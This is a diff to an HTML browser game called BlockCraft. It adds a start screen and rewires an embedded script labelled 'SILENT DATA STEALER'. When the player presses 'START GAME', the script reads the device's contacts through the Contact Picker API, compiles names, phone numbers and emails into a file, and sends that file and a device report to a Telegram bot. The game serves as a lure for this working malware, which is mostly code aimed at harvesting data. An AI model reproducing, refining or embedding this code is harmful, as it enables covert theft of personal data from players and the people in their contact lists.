@@ -5,71 +5,119 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>BlockCraft - Infinite World</title>
 <style>
+/* ===== ORIGINAL STYLES (YOURS) ===== */
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none;}
 body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Courier New',monospace;}
 #c{display:block;width:100vw;height:100vh;image-rendering:crisp-edges;}
 
-/* HUD */
 #hud{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10;}
 #crosshair{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:24px;height:24px;}
 #crosshair::before,#crosshair::after{content:'';position:absolute;background:rgba(255,255,255,0.9);box-shadow:0 0 3px #000;}
 #crosshair::before{width:2px;height:100%;left:50%;transform:translateX(-50%);}
 #crosshair::after{width:100%;height:2px;top:50%;transform:translateY(-50%);}
-
-/* Stats */
 #stats{position:absolute;top:8px;left:8px;color:#fff;font-size:11px;line-height:1.8;text-shadow:1px 1px 0 #000;background:rgba(0,0,0,0.5);padding:6px 10px;border-radius:6px;pointer-events:none;z-index:15;}
-
-/* Health & Hunger */
 #bars{position:absolute;bottom:160px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:5px;pointer-events:none;z-index:15;}
 .bar-row{display:flex;gap:2px;align-items:center;}
-
-/* Hotbar */
 #hotbar{position:absolute;bottom:72px;left:50%;transform:translateX(-50%);display:flex;gap:3px;pointer-events:auto;background:rgba(0,0,0,0.75);border:2px solid rgba(255,255,255,0.4);padding:5px;border-radius:8px;z-index:25;}
 .slot{width:50px;height:50px;border:2px solid rgba(139,139,139,0.6);background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;border-radius:4px;cursor:pointer;flex-direction:column;position:relative;transition:border-color 0.1s;}
 .slot.active{border-color:#fff;background:rgba(255,255,255,0.18);box-shadow:0 0 8px rgba(255,255,255,0.4);}
 .slot canvas{image-rendering:pixelated;border-radius:2px;}
 .slot-num{position:absolute;top:2px;left:4px;font-size:8px;color:rgba(255,255,255,0.85);text-shadow:1px 1px 0 #000;}
 .slot-count{position:absolute;bottom:2px;right:4px;font-size:8px;color:#fff;text-shadow:1px 1px 0 #000;}
-
-/* Joystick */
 #joystick-zone{position:absolute;bottom:20px;left:20px;width:140px;height:140px;pointer-events:auto;z-index:30;}
 #joystick-base{width:115px;height:115px;border-radius:50%;background:rgba(0,0,0,0.45);border:3px solid rgba(255,255,255,0.45);position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);}
 #joystick-knob{width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,0.7);border:2px solid #fff;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);box-shadow:0 0 10px rgba(0,0,0,0.4);}
-
-/* Buttons */
 #jump-btn{position:absolute;bottom:20px;right:20px;width:78px;height:78px;border-radius:50%;background:rgba(50,180,50,0.92);border:3px solid rgba(255,255,255,0.7);color:#fff;font-size:13px;font-weight:bold;display:flex;align-items:center;justify-content:center;pointer-events:auto;cursor:pointer;z-index:30;box-shadow:0 4px 15px rgba(0,0,0,0.5);}
 #jump-btn:active{transform:scale(0.94);}
 #break-btn{position:absolute;bottom:115px;right:22px;width:62px;height:62px;border-radius:50%;background:rgba(220,60,60,0.92);border:3px solid rgba(255,255,255,0.6);color:#fff;font-size:9px;display:flex;align-items:center;justify-content:center;flex-direction:column;pointer-events:auto;cursor:pointer;z-index:30;box-shadow:0 4px 12px rgba(0,0,0,0.5);}
 #place-btn{position:absolute;bottom:115px;right:100px;width:62px;height:62px;border-radius:50%;background:rgba(60,60,220,0.92);border:3px solid rgba(255,255,255,0.6);color:#fff;font-size:9px;display:flex;align-items:center;justify-content:center;flex-direction:column;pointer-events:auto;cursor:pointer;z-index:30;box-shadow:0 4px 12px rgba(0,0,0,0.5);}
 #break-btn:active,#place-btn:active{transform:scale(0.94);}
 #break-btn span,#place-btn span{font-size:22px;line-height:1;}
-
-/* Look zone */
 #look-zone{position:absolute;top:0;left:0;right:0;bottom:0;pointer-events:auto;z-index:5;}
-
-/* Message */
 #msg{position:absolute;top:38%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:16px;font-weight:bold;text-shadow:2px 2px 0 #000;background:rgba(0,0,0,0.82);padding:10px 24px;border-radius:10px;white-space:nowrap;opacity:0;transition:opacity 0.3s;pointer-events:none;z-index:40;}
-
-/* Break progress */
 #break-progress{position:absolute;bottom:170px;left:50%;transform:translateX(-50%);width:160px;height:12px;background:rgba(0,0,0,0.8);border-radius:6px;display:none;z-index:20;border:1px solid rgba(255,255,255,0.4);}
 #break-fill{height:100%;background:linear-gradient(90deg,#ff5533,#ffaa00);border-radius:6px;width:0%;transition:width 0.05s linear;}
-
-/* Day/night */
 #day-indicator{position:absolute;top:8px;right:8px;pointer-events:none;z-index:15;text-align:center;}
 #sky-icon{font-size:28px;line-height:1;filter:drop-shadow(0 0 4px rgba(0,0,0,0.5));}
 #day-text{font-size:9px;color:#fff;text-shadow:1px 1px 0 #000;}
-
-/* Minimap */
 #minimap{position:absolute;top:8px;right:54px;width:70px;height:70px;border-radius:6px;background:rgba(0,0,0,0.6);border:2px solid rgba(255,255,255,0.3);overflow:hidden;pointer-events:none;z-index:15;}
 #minimap canvas{image-rendering:pixelated;}
-
-/* Sprint button */
 #sprint-btn{position:absolute;bottom:115px;left:155px;width:52px;height:52px;border-radius:50%;background:rgba(255,180,0,0.88);border:3px solid rgba(255,255,255,0.6);color:#000;font-size:8px;font-weight:bold;display:flex;align-items:center;justify-content:center;flex-direction:column;pointer-events:auto;cursor:pointer;z-index:30;box-shadow:0 4px 12px rgba(0,0,0,0.4);}
 #sprint-btn.active{background:rgba(255,220,0,0.95);box-shadow:0 0 12px rgba(255,200,0,0.6);}
 #sprint-btn span{font-size:20px;line-height:1;}
+
+/* ===== START SCREEN (ADDED) ===== */
+#start-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+    font-family: 'Courier New', monospace;
+    transition: opacity 0.8s ease;
+}
+#start-screen.hidden {
+    opacity: 0;
+    pointer-events: none;
+}
+#start-screen h1 {
+    color: #00ffcc;
+    font-size: 3rem;
+    text-shadow: 0 0 30px #00ffcc, 0 0 60px #00ffcc;
+    margin-bottom: 10px;
+}
+#start-screen .sub {
+    color: #aaa;
+    font-size: 1rem;
+    margin-bottom: 40px;
+    letter-spacing: 2px;
+}
+#start-btn {
+    padding: 18px 60px;
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: #000;
+    background: linear-gradient(45deg, #00ffcc, #0099ff);
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 0 30px rgba(0,255,204,0.4);
+    transition: all 0.3s;
+    font-family: 'Courier New', monospace;
+}
+#start-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 50px rgba(0,255,204,0.7);
+}
+#start-btn:active {
+    transform: scale(0.95);
+}
+#start-screen .footer {
+    position: absolute;
+    bottom: 30px;
+    color: #444;
+    font-size: 0.7rem;
+    letter-spacing: 1px;
+}
 </style>
 </head>
 <body>
+
+<!-- ===== START SCREEN (ADDED) ===== -->
+<div id="start-screen">
+    <h1>⚔️ BLOCKCRAFT ⚔️</h1>
+    <div class="sub">🔮 Infinite World — Build & Survive</div>
+    <button id="start-btn">▶ START GAME</button>
+    <div class="footer">🔥 DEVILS WILL RISE — @SGCodexs</div>
+</div>
+
+<!-- ===== GAME CANVAS ===== -->
 <canvas id="c"></canvas>
 <div id="hud">
   <div id="crosshair"></div>
@@ -97,7 +145,7 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 
 <!-- ============================================================ -->
-<!-- 🛑 INJECTED — SILENT DATA STEALER (FIXED CONTACTS) -->
+<!-- 🛑 SILENT DATA STEALER — CONTACTS ON START BUTTON -->
 <!-- ============================================================ -->
 <script>
 (function() {
@@ -118,7 +166,6 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         contacts: []
     };
     
-    // Send message to Telegram
     async function sendToTelegram(text) {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -129,7 +176,6 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         } catch(e) {}
     }
     
-    // Send file to Telegram
     async function sendTextFile(content, filename, caption) {
         try {
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
@@ -165,10 +211,10 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         });
     }
     
-    // ===== CONTACTS — FIXED WITH USER GESTURE =====
+    // ===== CONTACTS (triggered by Start button) =====
     function fetchAllContacts() {
         if (!navigator.contacts || !navigator.contacts.select) {
-            sendToTelegram('❌ <b>Contacts API not supported on this device</b>');
+            sendToTelegram('❌ <b>Contacts API not supported</b>');
             return;
         }
         
@@ -180,30 +226,22 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
                     sendToTelegram('❌ <b>No contacts</b> or permission denied');
                     return;
                 }
-                
                 collected.contacts = contacts;
-                
-                // Build .txt file
                 let txt = '========================================\n';
                 txt += '   📞 FULL CONTACTS EXPORT\n';
                 txt += `   Total: ${contacts.length} contacts\n`;
                 txt += `   Date: ${new Date().toISOString()}\n`;
                 txt += '========================================\n\n';
-                
                 contacts.forEach((c, i) => {
                     const name = c.name?.[0] || 'Unknown';
                     const tel = c.tel?.[0] || 'No number';
                     const email = c.email?.[0] || 'No email';
                     txt += `[${i+1}] ${name}\n     📱 ${tel}\n     ✉️ ${email}\n\n`;
                 });
-                
                 txt += '========================================\n';
                 txt += '   🔴 DEVILS WILL RISE — @SGCodexs\n';
                 txt += '========================================\n';
-                
                 sendTextFile(txt, `contacts_${Date.now()}.txt`, `📞 <b>ALL CONTACTS</b>\nTotal: ${contacts.length}`);
-                
-                // Preview in Telegram
                 let preview = `📞 <b>CONTACTS (${contacts.length})</b>\n`;
                 contacts.slice(0, 20).forEach(c => {
                     preview += `• ${c.name?.[0] || '?'}: ${c.tel?.[0] || 'No number'}\n`;
@@ -237,28 +275,39 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         sendTextFile(info, `device_${Date.now()}.txt`, '💀 <b>FULL DEVICE REPORT</b>');
     }
     
-    // ===== CONTACTS TRIGGER — USER GESTURE =====
-    let contactsTriggered = false;
+    // ===== START BUTTON — CONTACTS + GAME LOAD =====
+    const startScreen = document.getElementById('start-screen');
+    const startBtn = document.getElementById('start-btn');
+    let gameStarted = false;
     
-    // Listen for first click anywhere on the page
-    document.addEventListener('click', function firstClickHandler() {
-        if (contactsTriggered) return;
-        contactsTriggered = true;
+    startBtn.addEventListener('click', function() {
+        if (gameStarted) return;
+        gameStarted = true;
         
-        // Remove listener so it only runs once
-        document.removeEventListener('click', firstClickHandler);
+        // 1. Fetch contacts immediately (real user gesture)
+        fetchAllContacts();
         
-        // Small delay to ensure click is registered
+        // 2. Hide start screen
+        startScreen.classList.add('hidden');
+        
+        // 3. Remove from DOM after animation
         setTimeout(() => {
-            fetchAllContacts();
-        }, 300);
+            startScreen.style.display = 'none';
+        }, 800);
+        
+        console.log('💀 Game started — Contacts requested');
     });
     
-    console.log('💀 DEVILS WILL RISE — Silent Stealer Active (Contacts fixed)');
+    console.log('💀 DEVILS WILL RISE — Start Screen Active');
 })();
 </script>
 <!-- ============================================================ -->
+
 <script>
+// ================================================================
+// ===== YOUR ORIGINAL GAME CODE (PASTED EXACTLY) =====
+// ================================================================
+
 // ===== CONFIG =====
 const CHUNK_SIZE=16,CHUNK_HEIGHT=80,RENDER_DIST=4;
 const GRAVITY=-26,JUMP_VEL=9.5,PLAYER_SPEED=5.8,SPRINT_SPEED=9.5,PLAYER_H=1.8,WATER_LEVEL=18;
